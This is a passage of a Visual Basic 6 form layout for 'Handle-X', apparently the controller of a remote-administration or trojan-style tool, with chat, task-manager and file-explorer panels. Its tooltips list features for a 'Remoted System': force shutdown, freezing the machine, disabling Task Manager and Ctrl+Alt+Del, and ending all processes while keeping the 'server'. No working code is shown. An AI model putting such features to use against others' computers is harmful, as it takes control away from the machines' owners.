                     Picture         =   "frm_main.frx":BB02
                     Key             =   ""
                  EndProperty
                  BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
                     Picture         =   "frm_main.frx":BBE4
                     Key             =   ""
                  EndProperty
                  BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
                     Picture         =   "frm_main.frx":E8EE
                     Key             =   ""
                  EndProperty
               EndProperty
            End
            Begin VB.Line WBline 
               BorderWidth     =   3
               Visible         =   0   'False
               X1              =   960
               X2              =   960
               Y1              =   1320
               Y2              =   2400
            End
         End
         Begin VB.Image WhiteBoardButtons 
            Appearance      =   0  'Flat
            Height          =   255
            Index           =   5
            Left            =   5860
            Stretch         =   -1  'True
            ToolTipText     =   "Save As..."
            Top             =   4080
            Width           =   255
         End
         Begin VB.Label WBSelectColor 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00000000&
            BorderStyle     =   1  'Fixed Single
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Left            =   8160
            MouseIcon       =   "frm_main.frx":EE88
            MousePointer    =   99  'Custom
            TabIndex        =   206
            ToolTipText     =   "Force The Remoted System To ShutDown"
            Top             =   4080
            Width           =   255
         End
         Begin VB.Line Line2 
            BorderWidth     =   2
            Index           =   58
            X1              =   4440
            X2              =   4440
            Y1              =   3915
            Y2              =   4435
         End
         Begin VB.Label bar 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00000000&
            BackStyle       =   0  'Transparent
            Caption         =   "Tools:-"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   178
               Weight          =   700
               Underline       =   -1  'True
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   5
            Left            =   4560
            TabIndex        =   205
            Top             =   4080
            Width           =   705
         End
         Begin VB.Image WhiteBoardButtons 
            Appearance      =   0  'Flat
            Height          =   255
            Index           =   4
            Left            =   7700
            Stretch         =   -1  'True
            ToolTipText     =   "Pin Size"
            Top             =   4080
            Width           =   255
         End
         Begin VB.Image WhiteBoardButtons 
            Appearance      =   0  'Flat
            Height          =   255
            Index           =   3
            Left            =   7240
            ToolTipText     =   "Spray Tool"
            Top             =   4080
            Width           =   255
         End
         Begin VB.Image WhiteBoardButtons 
            Appearance      =   0  'Flat
            Height          =   255
            Index           =   2
            Left            =   6780
            ToolTipText     =   "Line Tool"
            Top             =   4080
            Width           =   255
         End
         Begin VB.Image WhiteBoardButtons 
            Appearance      =   0  'Flat
            BorderStyle     =   1  'Fixed Single
            Height          =   255
            Index           =   1
            Left            =   6320
            ToolTipText     =   "Pin Tool"
            Top             =   4080
            Width           =   255
         End
         Begin VB.Image WhiteBoardButtons 
            Appearance      =   0  'Flat
            Height          =   255
            Index           =   0
            Left            =   5400
            ToolTipText     =   "New"
            Top             =   4080
            Width           =   255
         End
         Begin VB.Label ChatButtons 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00E0E0E0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Log Out"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   19
            Left            =   2280
            MouseIcon       =   "frm_main.frx":F192
            MousePointer    =   99  'Custom
            TabIndex        =   204
            ToolTipText     =   "Force The Remoted System To ShutDown"
            Top             =   4080
            Width           =   1935
         End
         Begin VB.Label ChatButtons 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00E0E0E0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Log In"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   255
            Index           =   18
            Left            =   200
            MouseIcon       =   "frm_main.frx":F49C
            MousePointer    =   99  'Custom
            TabIndex        =   202
            ToolTipText     =   "Force The Remoted System To ShutDown"
            Top             =   4080
            Width           =   1935
         End
      End
      Begin VB.Label RoomTitle 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "\Handle-X\Chat Manager :\>_"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   1
         Left            =   0
         TabIndex        =   41
         Top             =   0
         Width           =   8595
      End
      Begin VB.Label ChatCat 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C0C0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Play Games"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   4
         Left            =   4320
         MouseIcon       =   "frm_main.frx":F7A6
         MousePointer    =   99  'Custom
         TabIndex        =   58
         Top             =   240
         Width           =   1095
      End
      Begin VB.Label ChatCat 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00808080&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Msg Boxes"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   0
         Left            =   0
         MouseIcon       =   "frm_main.frx":FAB0
         MousePointer    =   99  'Custom
         TabIndex        =   50
         Top             =   240
         Width           =   1095
      End
      Begin VB.Label ChatCat 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C0C0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "White Board"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   3
         Left            =   3120
         MouseIcon       =   "frm_main.frx":FDBA
         MousePointer    =   99  'Custom
         TabIndex        =   53
         Top             =   240
         Width           =   1215
      End
      Begin VB.Label ChatCat 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C0C0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Voice Chat"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   2
         Left            =   2040
         MouseIcon       =   "frm_main.frx":100C4
         MousePointer    =   99  'Custom
         TabIndex        =   52
         Top             =   240
         Width           =   1095
      End
      Begin VB.Label ChatCat 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C0C0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Text Chat"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   1
         Left            =   1080
         MouseIcon       =   "frm_main.frx":103CE
         MousePointer    =   99  'Custom
         TabIndex        =   51
         Top             =   240
         Width           =   975
      End
   End
   Begin VB.PictureBox room 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      ForeColor       =   &H80000008&
      Height          =   375
      Index           =   3
      Left            =   10320
      ScaleHeight     =   345
      ScaleWidth      =   345
      TabIndex        =   4
      Top             =   2280
      Visible         =   0   'False
      Width           =   375
      Begin MSComctlLib.ImageList TaskManagerImageList 
         Left            =   5640
         Top             =   2520
         _ExtentX        =   1005
         _ExtentY        =   1005
         BackColor       =   -2147483643
         ImageWidth      =   12
         ImageHeight     =   12
         MaskColor       =   12632256
         _Version        =   393216
         BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
            NumListImages   =   27
            BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":106D8
               Key             =   ""
            EndProperty
            BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":1152A
               Key             =   ""
            EndProperty
            BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":1257C
               Key             =   ""
            EndProperty
            BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":12B16
               Key             =   ""
            EndProperty
            BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":139F0
               Key             =   ""
            EndProperty
            BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":13B4A
               Key             =   ""
            EndProperty
            BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":14424
               Key             =   ""
            EndProperty
            BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":1712E
               Key             =   ""
            EndProperty
            BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":17F80
               Key             =   ""
            EndProperty
            BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":18DD2
               Key             =   ""
            EndProperty
            BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":196AC
               Key             =   ""
            EndProperty
            BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":1A386
               Key             =   ""
            EndProperty
            BeginProperty ListImage13 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":1A4E0
               Key             =   ""
            EndProperty
            BeginProperty ListImage14 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":1AA7A
               Key             =   ""
            EndProperty
            BeginProperty ListImage15 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":1B014
               Key             =   ""
            EndProperty
            BeginProperty ListImage16 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":1C066
               Key             =   ""
            EndProperty
            BeginProperty ListImage17 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":1D0B8
               Key             =   ""
            EndProperty
            BeginProperty ListImage18 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":1D50A
               Key             =   ""
            EndProperty
            BeginProperty ListImage19 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":1D95C
               Key             =   ""
            EndProperty
            BeginProperty ListImage20 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":1E636
               Key             =   ""
            EndProperty
            BeginProperty ListImage21 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":1E790
               Key             =   ""
            EndProperty
            BeginProperty ListImage22 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":2049A
               Key             =   ""
            EndProperty
            BeginProperty ListImage23 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":21174
               Key             =   ""
            EndProperty
            BeginProperty ListImage24 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":2170E
               Key             =   ""
            EndProperty
            BeginProperty ListImage25 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":21FE8
               Key             =   ""
            EndProperty
            BeginProperty ListImage26 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":228C2
               Key             =   ""
            EndProperty
            BeginProperty ListImage27 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":22E5C
               Key             =   ""
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.ListView TaskView 
         Height          =   4200
         Left            =   3320
         TabIndex        =   48
         Top             =   670
         Width           =   5260
         _ExtentX        =   9287
         _ExtentY        =   7408
         View            =   3
         LabelEdit       =   1
         Sorted          =   -1  'True
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         AllowReorder    =   -1  'True
         FullRowSelect   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         ForeColor       =   0
         BackColor       =   16777215
         BorderStyle     =   1
         Appearance      =   0
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   5
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "Task Title"
            Object.Width           =   3351
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "HWnd"
            Object.Width           =   1658
         EndProperty
         BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   2
            Text            =   "P_HWnd"
            Object.Width           =   1429
         EndProperty
         BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   3
            Text            =   "Hidden?"
            Object.Width           =   1164
         EndProperty
         BeginProperty ColumnHeader(5) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   4
            Text            =   "Disabled?"
            Object.Width           =   1164
         EndProperty
      End
      Begin MSComctlLib.ListView ProcView 
         Height          =   4200
         Left            =   460
         TabIndex        =   49
         Top             =   675
         Width           =   2720
         _ExtentX        =   4789
         _ExtentY        =   7408
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         AllowReorder    =   -1  'True
         FullRowSelect   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         ForeColor       =   0
         BackColor       =   16777215
         BorderStyle     =   1
         Appearance      =   0
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   4
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "ProcName"
            Object.Width           =   2328
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "P"
            Object.Width           =   494
         EndProperty
         BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   2
            Text            =   "ID"
            Object.Width           =   1058
         EndProperty
         BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   3
            Text            =   "No Of Threads"
            Object.Width           =   899
         EndProperty
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   8
         Left            =   2250
         Stretch         =   -1  'True
         ToolTipText     =   "Get Parent"
         Top             =   285
         Width           =   255
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   300
         Index           =   27
         Left            =   45
         Stretch         =   -1  'True
         ToolTipText     =   "UnFreez The Remoted System (If It  Previouslly Freezed By The Freez  Command)"
         Top             =   3240
         Width           =   300
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   300
         Index           =   26
         Left            =   45
         Stretch         =   -1  'True
         ToolTipText     =   "Freez All The Remoted System (Hang The System)"
         Top             =   2820
         Width           =   300
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   300
         Index           =   25
         Left            =   45
         Stretch         =   -1  'True
         ToolTipText     =   "Enable TaskManager/[ALT+CTRL+DEL] on all Windows."
         Top             =   2400
         Width           =   300
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   300
         Index           =   24
         Left            =   45
         Stretch         =   -1  'True
         ToolTipText     =   "Disable TaskManager/[ALT+CTRL+DEL] on all Windows."
         Top             =   1980
         Width           =   300
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   23
         Left            =   8300
         Stretch         =   -1  'True
         ToolTipText     =   "Send Keys"
         Top             =   300
         Width           =   255
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   22
         Left            =   7920
         Stretch         =   -1  'True
         ToolTipText     =   "Flash Window"
         Top             =   300
         Width           =   255
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   21
         Left            =   7540
         Stretch         =   -1  'True
         ToolTipText     =   "Restore Window"
         Top             =   300
         Width           =   255
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   20
         Left            =   7160
         Stretch         =   -1  'True
         ToolTipText     =   "Minimize Window"
         Top             =   300
         Width           =   255
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   19
         Left            =   6780
         Stretch         =   -1  'True
         ToolTipText     =   "Maximize Window"
         Top             =   300
         Width           =   255
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   300
         Index           =   1
         Left            =   45
         Stretch         =   -1  'True
         ToolTipText     =   "Refresh All"
         Top             =   300
         Width           =   300
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   18
         Left            =   6400
         Stretch         =   -1  'True
         ToolTipText     =   "Make Not On Top"
         Top             =   300
         Width           =   255
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   17
         Left            =   6020
         Stretch         =   -1  'True
         ToolTipText     =   "Make On Top"
         Top             =   300
         Width           =   255
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   16
         Left            =   5640
         Stretch         =   -1  'True
         ToolTipText     =   "Show Window"
         Top             =   285
         Width           =   255
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   15
         Left            =   5260
         Stretch         =   -1  'True
         ToolTipText     =   "Hide Window"
         Top             =   285
         Width           =   255
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   14
         Left            =   4880
         Stretch         =   -1  'True
         ToolTipText     =   "Enable Window"
         Top             =   285
         Width           =   255
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   13
         Left            =   4500
         Stretch         =   -1  'True
         ToolTipText     =   "Disable Window"
         Top             =   285
         Width           =   255
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   12
         Left            =   4120
         Stretch         =   -1  'True
         ToolTipText     =   "End Task"
         Top             =   285
         Width           =   255
      End
      Begin VB.Label RoomTitle 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "\Handle-X\Task Manager :\>_"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   3
         Left            =   0
         TabIndex        =   47
         Top             =   0
         Width           =   8655
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   11
         Left            =   3740
         Stretch         =   -1  'True
         ToolTipText     =   "Rename Task"
         Top             =   285
         Width           =   255
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   10
         Left            =   3360
         Stretch         =   -1  'True
         ToolTipText     =   "New Task..."
         Top             =   285
         Width           =   255
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   9
         Left            =   2800
         Stretch         =   -1  'True
         ToolTipText     =   "Get Child(s)"
         Top             =   285
         Width           =   255
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   7
         Left            =   1700
         Stretch         =   -1  'True
         ToolTipText     =   "Set Periority"
         Top             =   285
         Width           =   255
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   6
         Left            =   1150
         Stretch         =   -1  'True
         ToolTipText     =   "Susspend Process"
         Top             =   285
         Width           =   255
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   5
         Left            =   600
         Stretch         =   -1  'True
         ToolTipText     =   "End Process"
         Top             =   285
         Width           =   255
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   300
         Index           =   4
         Left            =   45
         Stretch         =   -1  'True
         ToolTipText     =   "End All Processes (Keep The Server ;-) )"
         Top             =   1560
         Width           =   300
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   300
         Index           =   3
         Left            =   45
         Stretch         =   -1  'True
         ToolTipText     =   "Reserved"
         Top             =   1140
         Width           =   300
      End
      Begin VB.Image Task_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   300
         Index           =   2
         Left            =   45
         Stretch         =   -1  'True
         ToolTipText     =   "Copy All To X-Editor"
         Top             =   720
         Width           =   300
      End
      Begin VB.Line Line1 
         BorderColor     =   &H00000000&
         BorderWidth     =   2
         Index           =   13
         X1              =   400
         X2              =   400
         Y1              =   240
         Y2              =   5040
      End
      Begin VB.Line Line1 
         BorderColor     =   &H00000000&
         BorderWidth     =   2
         Index           =   12
         X1              =   3240
         X2              =   3240
         Y1              =   240
         Y2              =   4920
      End
      Begin VB.Line Line1 
         BorderWidth     =   2
         Index           =   10
         X1              =   400
         X2              =   8595
         Y1              =   615
         Y2              =   615
      End
   End
   Begin VB.PictureBox room 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      ForeColor       =   &H80000008&
      Height          =   375
      Index           =   2
      Left            =   10320
      ScaleHeight     =   345
      ScaleWidth      =   345
      TabIndex        =   3
      Top             =   1920
      Visible         =   0   'False
      Width           =   375
      Begin MSComctlLib.ImageList ImageList1 
         Left            =   5160
         Top             =   2280
         _ExtentX        =   1005
         _ExtentY        =   1005
         BackColor       =   16777215
         ImageWidth      =   10
         ImageHeight     =   10
         UseMaskColor    =   0   'False
         _Version        =   393216
         BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
            NumListImages   =   27
            BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":233F6
               Key             =   ""
            EndProperty
            BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":24248
               Key             =   ""
            EndProperty
            BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":24B22
               Key             =   ""
            EndProperty
            BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":257FC
               Key             =   ""
            EndProperty
            BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":25C4E
               Key             =   ""
            EndProperty
            BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":28400
               Key             =   ""
            EndProperty
            BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":2855A
               Key             =   ""
            EndProperty
            BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":28E34
               Key             =   ""
            EndProperty
            BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":29B0E
               Key             =   ""
            EndProperty
            BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":29F60
               Key             =   ""
            EndProperty
            BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":2ADB2
               Key             =   ""
            EndProperty
            BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":2E0F4
               Key             =   ""
            EndProperty
            BeginProperty ListImage13 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":2E9CE
               Key             =   ""
            EndProperty
            BeginProperty ListImage14 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":2F2A8
               Key             =   ""
            EndProperty
            BeginProperty ListImage15 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":30FB2
               Key             =   "Download_Tool"
               Object.Tag             =   "Download_Tool"
            EndProperty
            BeginProperty ListImage16 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":31404
               Key             =   "Upload_Tool"
               Object.Tag             =   "Upload_Tool"
            EndProperty
            BeginProperty ListImage17 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":31856
               Key             =   "None"
               Object.Tag             =   "None"
            EndProperty
            BeginProperty ListImage18 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":31B70
               Key             =   "Doc"
               Object.Tag             =   "Doc"
            EndProperty
            BeginProperty ListImage19 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":3387A
               Key             =   "Audio"
               Object.Tag             =   "Audio"
            EndProperty
            BeginProperty ListImage20 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":34554
               Key             =   "Exe"
               Object.Tag             =   "Exe"
            EndProperty
            BeginProperty ListImage21 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":34E2E
               Key             =   "Photo"
               Object.Tag             =   "Photo"
            EndProperty
            BeginProperty ListImage22 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":36FE0
               Key             =   "Video"
               Object.Tag             =   "Video"
            EndProperty
            BeginProperty ListImage23 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":39CEA
               Key             =   "Sys"
               Object.Tag             =   "Sys"
            EndProperty
            BeginProperty ListImage24 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":3D90C
               Key             =   "Dos"
               Object.Tag             =   "Dos"
            EndProperty
            BeginProperty ListImage25 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":3DC26
               Key             =   "Net"
               Object.Tag             =   "Net"
            EndProperty
            BeginProperty ListImage26 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":403D8
               Key             =   "Soft"
               Object.Tag             =   "Soft"
            EndProperty
            BeginProperty ListImage27 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":4082A
               Key             =   "Zip"
               Object.Tag             =   "Zip"
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.ListView Files_Explore 
         Height          =   4035
         Left            =   2595
